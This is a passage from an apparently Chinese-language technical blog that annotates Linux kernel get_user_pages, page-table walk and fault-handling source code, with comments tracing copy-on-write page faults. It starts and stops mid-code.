class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">long</span> __get_user_pages_locked(<span class="hljs-keyword">struct</span> task_struct *tsk,<br>						<span class="hljs-keyword">struct</span> mm_struct *mm,<br>						<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start,<br>						<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,<br>						<span class="hljs-type">int</span> write, <span class="hljs-type">int</span> force,<br>						<span class="hljs-keyword">struct</span> page **pages,<br>						<span class="hljs-keyword">struct</span> vm_area_struct **vmas,<br>						<span class="hljs-type">int</span> *locked, <span class="hljs-type">bool</span> notify_drop,<br>						<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)<br>&#123;<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	__get_user_pages_locked(tsk, mm, start, nr_pages, write, force,</span><br><span class="hljs-comment">				       pages, vmas, NULL, false, FOLL_TOUCH);</span><br><span class="hljs-comment">	tsk = NULL</span><br><span class="hljs-comment">	mm = file-&gt;private_data</span><br><span class="hljs-comment">	start = addr</span><br><span class="hljs-comment">	nr_pages = 1</span><br><span class="hljs-comment">	write = write</span><br><span class="hljs-comment">	force = 1 </span><br><span class="hljs-comment">	page = NULL</span><br><span class="hljs-comment">	vmas = NULL</span><br><span class="hljs-comment">	locked = NULL</span><br><span class="hljs-comment">	notify_drop = false</span><br><span class="hljs-comment">	flags = FOLL_TOUCH</span><br><span class="hljs-comment">	*/</span><br>	<span class="hljs-type">long</span> ret, pages_done;<br>	<span class="hljs-type">bool</span> lock_dropped;<br><br>	<span class="hljs-keyword">if</span> (locked) &#123;<br>		<span class="hljs-comment">/* if VM_FAULT_RETRY can be returned, vmas become invalid */</span><br>		BUG_ON(vmas);<br>		<span class="hljs-comment">/* check caller initialized locked */</span><br>		BUG_ON(*locked != <span class="hljs-number">1</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (pages) <br>		flags |= FOLL_GET; <span class="hljs-comment">//需要获取页</span><br>	<span class="hljs-keyword">if</span> (write)<br>		flags |= FOLL_WRITE; <span class="hljs-comment">//PTE可写</span><br>	<span class="hljs-keyword">if</span> (force)<br>		flags |= FOLL_FORCE; <span class="hljs-comment">//具有可读/写权限</span><br><br>	pages_done = <span class="hljs-number">0</span>;<br>	lock_dropped = <span class="hljs-literal">false</span>;<br>	<span class="hljs-keyword">for</span> (;;) &#123;<br>		ret = __get_user_pages(tsk, mm, start, nr_pages, flags, pages,<br>				       vmas, locked);<br>		<span class="hljs-keyword">if</span> (!locked)<br>			<span class="hljs-comment">/* VM_FAULT_RETRY couldn&#x27;t trigger, bypass */</span><br>			<span class="hljs-keyword">return</span> ret; <span class="hljs-comment">//直接返回</span><br><br>		<span class="hljs-comment">/* VM_FAULT_RETRY cannot return errors */</span><br>		<span class="hljs-keyword">if</span> (!*locked) &#123;<br>			BUG_ON(ret &lt; <span class="hljs-number">0</span>);<br>			BUG_ON(ret &gt;= nr_pages);<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (!pages)<br>			<span class="hljs-comment">/* If it&#x27;s a prefault don&#x27;t insist harder */</span><br>			<span class="hljs-keyword">return</span> ret;<br><br>		<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>			nr_pages -= ret;<br>			pages_done += ret;<br>			<span class="hljs-keyword">if</span> (!nr_pages)<br>				<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-keyword">if</span> (*locked) &#123;<br>			<span class="hljs-comment">/* VM_FAULT_RETRY didn&#x27;t trigger */</span><br>			<span class="hljs-keyword">if</span> (!pages_done)<br>				pages_done = ret;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		<span class="hljs-comment">/* VM_FAULT_RETRY triggered, so seek to the faulting offset */</span><br>		pages += ret;<br>		start += ret &lt;&lt; PAGE_SHIFT;<br><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Repeat on the address that fired VM_FAULT_RETRY</span><br><span class="hljs-comment">		 * without FAULT_FLAG_ALLOW_RETRY but with</span><br><span class="hljs-comment">		 * FAULT_FLAG_TRIED.</span><br><span class="hljs-comment">		 */</span><br>		*locked = <span class="hljs-number">1</span>;<br>		lock_dropped = <span class="hljs-literal">true</span>;<br>		down_read(&amp;mm-&gt;mmap_sem);<br>		ret = __get_user_pages(tsk, mm, start, <span class="hljs-number">1</span>, flags | FOLL_TRIED,<br>				       pages, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>		<span class="hljs-keyword">if</span> (ret != <span class="hljs-number">1</span>) &#123;<br>			BUG_ON(ret &gt; <span class="hljs-number">1</span>);<br>			<span class="hljs-keyword">if</span> (!pages_done)<br>				pages_done = ret;<br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>		nr_pages--;<br>		pages_done++;<br>		<span class="hljs-keyword">if</span> (!nr_pages)<br>			<span class="hljs-keyword">break</span>;<br>		pages++;<br>		start += PAGE_SIZE;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (notify_drop &amp;&amp; lock_dropped &amp;&amp; *locked) &#123;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * We must let the caller know we temporarily dropped the lock</span><br><span class="hljs-comment">		 * and so the critical section protected by it was lost.</span><br><span class="hljs-comment">		 */</span><br>		up_read(&amp;mm-&gt;mmap_sem);<br>		*locked = <span class="hljs-number">0</span>;<br>	&#125;<br>	<span class="hljs-keyword">return</span> pages_done;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="get-user-pages-1"><a href="#get-user-pages-1" class="headerlink" title="__get_user_pages"></a><strong>__get_user_pages</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>retry:<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * If we have a pending SIGKILL, don&#x27;t keep faulting pages and</span><br><span class="hljs-comment">		 * potentially allocating memory.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (unlikely(fatal_signal_pending(current))) <span class="hljs-comment">//用以捕获信号</span><br>			<span class="hljs-keyword">return</span> i ? i : -ERESTARTSYS;<br>		cond_resched(); <span class="hljs-comment">//进行进程调度，主动释放权限</span><br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">			第一次follow_page_mask，由于没有分配页表因此返回0，即page = 0,进入faultin_page,参数foll_flags的值为0x17，nonblocking值为0</span><br><span class="hljs-comment">			进入handle_mm_fault，fault_flags为1</span><br><span class="hljs-comment">			进入__handle__mm_fault，此时pte已经分配好，但是还没有与物理页进行映射</span><br><span class="hljs-comment">			进入handle_pte_fault，将pte与物理页进行映射</span><br><span class="hljs-comment">			进入do_fault函数对pte表进行处理</span><br><span class="hljs-comment">			进入do_cow_fault进行写时复制处理</span><br><span class="hljs-comment">			进入__do_fault</span><br><span class="hljs-comment">			</span><br><span class="hljs-comment">		*/</span><br>		page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);  <span class="hljs-comment">//获取页</span><br>		<span class="hljs-keyword">if</span> (!page) &#123;<br>			<span class="hljs-type">int</span> ret;<br>			ret = faultin_page(tsk, vma, start, &amp;foll_flags, <span class="hljs-comment">//页中断处理</span><br>					nonblocking);<br>			<span class="hljs-keyword">switch</span> (ret) &#123;<br>			<span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>				<span class="hljs-keyword">goto</span> retry;<br>			<span class="hljs-keyword">case</span> -EFAULT:<br>			<span class="hljs-keyword">case</span> -ENOMEM:<br>			<span class="hljs-keyword">case</span> -EHWPOISON:<br>				<span class="hljs-keyword">return</span> i ? i : ret;<br>			<span class="hljs-keyword">case</span> -EBUSY:<br>				<span class="hljs-keyword">return</span> i;<br>			<span class="hljs-keyword">case</span> -ENOENT:<br>				<span class="hljs-keyword">goto</span> next_page;<br>			&#125;<br>			BUG();<br>		&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (PTR_ERR(page) == -EEXIST) &#123;<br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Proper page table entry exists, but no corresponding</span><br><span class="hljs-comment">			 * struct page.</span><br><span class="hljs-comment">			 */</span><br>			<span class="hljs-keyword">goto</span> next_page;<br>		&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (IS_ERR(page)) &#123;<br>			<span class="hljs-keyword">return</span> i ? i : PTR_ERR(page);<br>		&#125;<br>		<span class="hljs-keyword">if</span> (pages) &#123;<br>			pages[i] = page;<br>			flush_anon_page(vma, page, start);<br>			flush_dcache_page(page);<br>			page_mask = <span class="hljs-number">0</span>;<br>		&#125;<br>next_page:<br>		<span class="hljs-keyword">if</span> (vmas) &#123;<br>			vmas[i] = vma;<br>			page_mask = <span class="hljs-number">0</span>;<br>		&#125;<br>		page_increm = <span class="hljs-number">1</span> + (~(start &gt;&gt; PAGE_SHIFT) &amp; page_mask);<br>		<span class="hljs-keyword">if</span> (page_increm &gt; nr_pages)<br>			page_increm = nr_pages;<br>		i += page_increm;<br>		start += page_increm * PAGE_SIZE;<br>		nr_pages -= page_increm;<br>	&#125; <span class="hljs-keyword">while</span> (nr_pages);<br>	<span class="hljs-keyword">return</span> i;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="follow-page-mask"><a href="#follow-page-mask" class="headerlink" title="follow_page_mask"></a>follow_page_mask</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_mask</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">			      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags,</span><br><span class="hljs-params">			      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *page_mask)</span><br>&#123; <span class="hljs-comment">//根据虚拟地址查找对应的物理页</span><br>  <span class="hljs-comment">//pgd-&gt;pud-&gt;pmd-&gt;ptl-&gt;pte</span><br>	<span class="hljs-type">pgd_t</span> *pgd; <br>	<span class="hljs-type">pud_t</span> *pud;<br>	<span class="hljs-type">pmd_t</span> *pmd;<br>	<span class="hljs-type">spinlock_t</span> *ptl;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br><br>	*page_mask = <span class="hljs-number">0</span>;<br><br>	page = follow_huge_addr(mm, address, flags &amp; FOLL_WRITE); <span class="hljs-comment">//判断是否为huag page</span><br>	<span class="hljs-keyword">if</span> (!IS_ERR(page)) &#123;<br>		BUG_ON(flags &amp; FOLL_GET);<br>		<span class="hljs-keyword">return</span> page;<br>	&#125;<br><br>	pgd = pgd_offset(mm, address); <span class="hljs-comment">//获取pgd对应的目录项</span><br>	<span class="hljs-keyword">if</span> (pgd_none(*pgd) || unlikely(pgd_bad(*pgd)))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	* 011111110 | 110110010 | 1000 0011 1 | 0111 1010 0 | 000000000000</span><br><span class="hljs-comment">	* 9 | 9 | 9 | 9 | 12|</span><br><span class="hljs-comment">	*/</span><br>	pud = pud_offset(pgd, address); <span class="hljs-comment">//获取pud对应的表项</span><br>	<span class="hljs-keyword">if</span> (pud_none(*pud)) <span class="hljs-comment">//判断pud对应的表项是否为空</span><br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	<span class="hljs-keyword">if</span> (pud_huge(*pud) &amp;&amp; vma-&gt;vm_flags &amp; VM_HUGETLB) &#123; <span class="hljs-comment">//判断是不是hug的页表</span><br>		page = follow_huge_pud(mm, address, pud, flags);<br>		<span class="hljs-keyword">if</span> (page)<br>			<span class="hljs-keyword">return</span> page;<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	&#125;<br>	<span class="hljs-keyword">if</span> (unlikely(pud_bad(*pud)))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><br>	pmd = pmd_offset(pud, address); <span class="hljs-comment">//获取pmd项</span><br>	<span class="hljs-keyword">if</span> (pmd_none(*pmd))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	<span class="hljs-keyword">if</span> (pmd_huge(*pmd) &amp;&amp; vma-&gt;vm_flags &amp; VM_HUGETLB) &#123;<br>		page = follow_huge_pmd(mm, address, pmd, flags);<br>		<span class="hljs-keyword">if</span> (page)<br>			<span class="hljs-keyword">return</span> page;<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	&#125;<br>	<span class="hljs-keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; pmd_protnone(*pmd))<br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>	<span class="hljs-keyword">if</span> (pmd_trans_huge(*pmd)) &#123; <span class="hljs-comment">//从hugb page中分割物理页</span><br>		<span class="hljs-keyword">if</span> (flags &amp; FOLL_SPLIT) &#123;<br>			split_huge_page_pmd(vma, address, pmd);<br>			<span class="hljs-keyword">return</span> follow_page_pte(vma, address, pmd, flags);<br>		&#125;<br>		ptl = pmd_lock(mm, pmd); <span class="hljs-comment">//获取ptl项</span><br>		<span class="hljs-keyword">if</span> (likely(pmd_trans_huge(*pmd))) &#123;<br>			<span class="hljs-keyword">if</span> (unlikely(pmd_trans_splitting(*pmd))) &#123;<br>				spin_unlock(ptl);<br>				wait_split_huge_page(vma-&gt;anon_vma, pmd);<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>				page = follow_trans_huge_pmd(vma, address,<br>							     pmd, flags);<br>				spin_unlock(ptl);<br>				*page_mask = HPAGE_PMD_NR - <span class="hljs-number">1</span>;<br>				<span class="hljs-keyword">return</span> page;<br>			&#125;<br>		&#125; <span class="hljs-keyword">else</span><br>			spin_unlock(ptl);<br>	&#125;<br>	<span class="hljs-keyword">return</span> follow_page_pte(vma, address, pmd, flags);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="follow-page-pte"><a href="#follow-page-pte" class="headerlink" title="follow_page_pte"></a>follow_page_pte</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<span class="hljs-title function_">follow_page_pte</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">pmd_t</span> *pmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br>	<span class="hljs-type">spinlock_t</span> *ptl;<br>	<span class="hljs-type">pte_t</span> *ptep, pte;<br><br>retry:<br>	<span class="hljs-keyword">if</span> (unlikely(pmd_bad(*pmd))) <span class="hljs-comment">//判断页表是否可以访问等权限</span><br>		<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br><br>	ptep = pte_offset_map_lock(mm, pmd, address, &amp;ptl); <span class="hljs-comment">//取出页框</span><br>	pte = *ptep;<br>	<span class="hljs-keyword">if</span> (!pte_present(pte)) &#123; <span class="hljs-comment">//判断pte内是否为空</span><br>		<span class="hljs-type">swp_entry_t</span> entry;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * KSM&#x27;s break_ksm() relies upon recognizing a ksm page</span><br><span class="hljs-comment">		 * even while it is being migrated, so for that case we</span><br><span class="hljs-comment">		 * need migration_entry_wait().</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (likely(!(flags &amp; FOLL_MIGRATION)))<br>			<span class="hljs-keyword">goto</span> no_page;<br>		<span class="hljs-keyword">if</span> (pte_none(pte))<br>			<span class="hljs-keyword">goto</span> no_page;<br>		entry = pte_to_swp_entry(pte);<br>		<span class="hljs-keyword">if</span> (!is_migration_entry(entry))<br>			<span class="hljs-keyword">goto</span> no_page;<br>		pte_unmap_unlock(ptep, ptl);<br>		migration_entry_wait(mm, pmd, address);<br>		<span class="hljs-keyword">goto</span> retry;<br>	&#125;<br>	<span class="hljs-keyword">if</span> ((flags &amp; FOLL_NUMA) &amp;&amp; pte_protnone(pte))<br>		<span class="hljs-keyword">goto</span> no_page;<br>	<span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123;<br>		pte_unmap_unlock(ptep, ptl);<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>	&#125;<br><br>	page = vm_normal_page(vma, address, pte); <span class="hljs-comment">//通过address与pte找到物理页</span><br>	<span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>		<span class="hljs-keyword">if</span> (flags &amp; FOLL_DUMP) &#123;<br>			<span class="hljs-comment">/* Avoid special (like zero) pages in core dumps */</span><br>			page = ERR_PTR(-EFAULT);<br>			<span class="hljs-keyword">goto</span> out;<br>		&#125;<br><br>		<span class="hljs-keyword">if</span> (is_zero_pfn(pte_pfn(pte))) &#123;<br>			page = pte_page(pte);<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-type">int</span> ret;<br><br>			ret = follow_pfn_pte(vma, address, ptep, flags);<br>			page = ERR_PTR(ret);<br>			<span class="hljs-keyword">goto</span> out;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-keyword">if</span> (flags &amp; FOLL_GET)<br>		get_page_foll(page);<br>	<span class="hljs-keyword">if</span> (flags &amp; FOLL_TOUCH) &#123;<br>		<span class="hljs-keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp;<br>		    !pte_dirty(pte) &amp;&amp; !PageDirty(page))<br>			set_page_dirty(page);<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * pte_mkyoung() would be more correct here, but atomic care</span><br><span class="hljs-comment">		 * is needed to avoid losing the dirty bit: it is easier to use</span><br><span class="hljs-comment">		 * mark_page_accessed().</span><br><span class="hljs-comment">		 */</span><br>		mark_page_accessed(page); <span class="hljs-comment">//标记页被访问</span><br>	&#125;<br>	<span class="hljs-keyword">if</span> ((flags &amp; FOLL_MLOCK) &amp;&amp; (vma-&gt;vm_flags &amp; VM_LOCKED)) &#123;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * The preliminary mapping check is mainly to avoid the</span><br><span class="hljs-comment">		 * pointless overhead of lock_page on the ZERO_PAGE</span><br><span class="hljs-comment">		 * which might bounce very badly if there is contention.</span><br><span class="hljs-comment">		 *</span><br><span class="hljs-comment">		 * If the page is already locked, we don&#x27;t need to</span><br><span class="hljs-comment">		 * handle it now - vmscan will handle it later if and</span><br><span class="hljs-comment">		 * when it attempts to reclaim the page.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (page-&gt;mapping &amp;&amp; trylock_page(page)) &#123;<br>			lru_add_drain();  <span class="hljs-comment">/* push cached pages to LRU */</span><br>			<span class="hljs-comment">/*</span><br><span class="hljs-comment">			 * Because we lock page here, and migration is</span><br><span class="hljs-comment">			 * blocked by the pte&#x27;s page reference, and we</span><br><span class="hljs-comment">			 * know the page is still mapped, we don&#x27;t even</span><br><span class="hljs-comment">			 * need to check for file-cache page truncation.</span><br><span class="hljs-comment">			 */</span><br>			mlock_vma_page(page);<br>			unlock_page(page);<br>		&#125;<br>	&#125;<br>out:<br>	pte_unmap_unlock(ptep, ptl);<br>	<span class="hljs-keyword">return</span> page; <span class="hljs-comment">//将物理页返回</span><br>no_page:<br>	pte_unmap_unlock(ptep, ptl);<br>	<span class="hljs-keyword">if</span> (!pte_none(pte))<br>		<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-keyword">return</span> no_page_table(vma, flags);<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="faultin-page"><a href="#faultin-page" class="headerlink" title="faultin_page"></a>faultin_page</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">faultin_page</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> vm_area_struct *vma,</span><br><span class="hljs-params">		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *flags, <span class="hljs-type">int</span> *nonblocking)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> vma-&gt;vm_mm;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fault_flags = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">int</span> ret;<br><br>	<span class="hljs-comment">/* mlock all present pages, but do not fault in new pages */</span><br>	<span class="hljs-keyword">if</span> ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)<br>		<span class="hljs-keyword">return</span> -ENOENT;<br>	<span class="hljs-comment">/* For mm_populate(), just skip the stack guard page. */</span><br>	<span class="hljs-keyword">if</span> ((*flags &amp; FOLL_POPULATE) &amp;&amp;<br>			(stack_guard_page_start(vma, address) ||<br>			 stack_guard_page_end(vma, address + PAGE_SIZE)))<br>		<span class="hljs-keyword">return</span> -ENOENT;<br>	<span class="hljs-keyword">if</span> (*flags &amp; FOLL_WRITE) <span class="hljs-comment">//判断是否需要写入页</span><br>		fault_flags |= FAULT_FLAG_WRITE;<br>	<span class="hljs-keyword">if</span> (nonblocking)<br>		fault_flags |= FAULT_FLAG_ALLOW_RETRY;<br>	<span class="hljs-keyword">if</span> (*flags &amp; FOLL_NOWAIT)<br>		fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;<br>	<span class="hljs-keyword">if</span> (*flags &amp; FOLL_TRIED) &#123;<br>		VM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);<br>		fault_flags |= FAULT_FLAG_TRIED;<br>	&#125;<br><br>	ret = handle_mm_fault(mm, vma, address, fault_flags);<br>	<span class="hljs-keyword">if</span> (ret &amp; VM_FAULT_ERROR) &#123;<br>		<span class="hljs-keyword">if</span> 